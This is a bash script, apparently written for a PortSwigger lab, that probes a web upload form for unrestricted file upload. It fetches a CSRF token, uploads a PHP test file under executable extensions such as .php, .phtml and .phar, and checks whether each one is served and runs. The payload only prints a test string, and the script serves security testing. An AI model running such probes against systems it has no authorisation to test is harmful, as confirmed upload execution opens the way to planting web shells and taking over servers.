#!/bin/bash

if [ -z "$1" ] || [ -z "$2" ]; then
  echo "[*] Usage: $0 <upload-url> <uploaded-files-base-url> [session-cookie]"
  echo "[*] Example: $0 https://example.com/upload.php   https://example.com/uploads/   session=abc123"
  exit 1
fi

UPLOAD_URL="$1"
BASE_URL="$2"
SESSION_COOKIE="${3:-}" # Optional

# Fetch CSRF token if session cookie is provided
if [ -n "$SESSION_COOKIE" ]; then
  # Derive account page URL from upload URL (We assume /my-account/avatar → /my-account where we get the CSRF token as we tested on PortSwigger's lab)
  ACCOUNT_URL="${UPLOAD_URL%/avatar}" # Remove /avatar from the end
  ACCOUNT_PAGE=$(curl -s -b "$SESSION_COOKIE" "$ACCOUNT_URL")
  CSRF_TOKEN=$(echo "$ACCOUNT_PAGE" | grep -o 'name="csrf" value="[^"]*"' | head -n1 | sed 's/.*value="//;s/"$//')
else
  CSRF_TOKEN=""
fi

TMP_FILE=$(mktemp) 
trap 'rm -f "$TMP_FILE"' EXIT

# Create a harmless test payload (non-malicious but with dangerous extensions)
cat > "$TMP_FILE" << 'EOF'
<?php echo "File upload test: " . basename(__FILE__); ?>
EOF

EXTENSIONS=("php" "phtml" "php3" "php4" "php5" "phar") # Add more extensions as per backend. We can also add the ones like php.jpg, php.png to check for extension bypass.

echo "[*] Testing file upload vulnerabilities..."

for ext in "${EXTENSIONS[@]}"; do
  echo "[*] Trying .$ext"
  
  # Upload file with dangerous extension
  if [ -n "$SESSION_COOKIE" ]; then
    if [ -n "$CSRF_TOKEN" ]; then
      response=$(curl -s -b "$SESSION_COOKIE" -F "user=wiener" -F "csrf=$CSRF_TOKEN" -F "avatar=@$TMP_FILE;filename=file.$ext" "$UPLOAD_URL") # Update this line accordingly as per the actual form. We tested on PortSwigger's lab and here it need these 3 parameters.
    else
      response=$(curl -s -b "$SESSION_COOKIE" -F "user=wiener" -F "avatar=@$TMP_FILE;filename=file.$ext" "$UPLOAD_URL")
    fi
  else
    response=$(curl -s -F "user=wiener" -F "avatar=@$TMP_FILE;filename=file.$ext" "$UPLOAD_URL")
  fi
  
  # Check if file is accessible via base URL
  check_url="${BASE_URL}file.$ext"
  if [ -n "$SESSION_COOKIE" ]; then
    http_code=$(curl -b "$SESSION_COOKIE" -s -o /dev/null -w "%{http_code}" "$check_url")
  else
    http_code=$(curl -s -o /dev/null -w "%{http_code}" "$check_url")
  fi

  if [ "$http_code" -eq 200 ]; then
    content=$(curl -s "$check_url")
    if echo "$content" | grep -q "File upload test"; then
      echo "[+] VULNERABLE: .$ext upload succeeded and is accessible!"
      echo "    URL: $check_url"
    else
      echo "[?] .$ext accessible but content not confirmed (code: $http_code)"
    fi
  elif [ "$http_code" -eq 403 ] || [ "$http_code" -eq 404 ]; then
    echo "[-] .$ext blocked or not found (HTTP $http_code)"
  else
    echo "[?] .$ext returned unexpected status: $http_code"
  fi
done

echo ""
echo "[+] Test completed. Review results above."
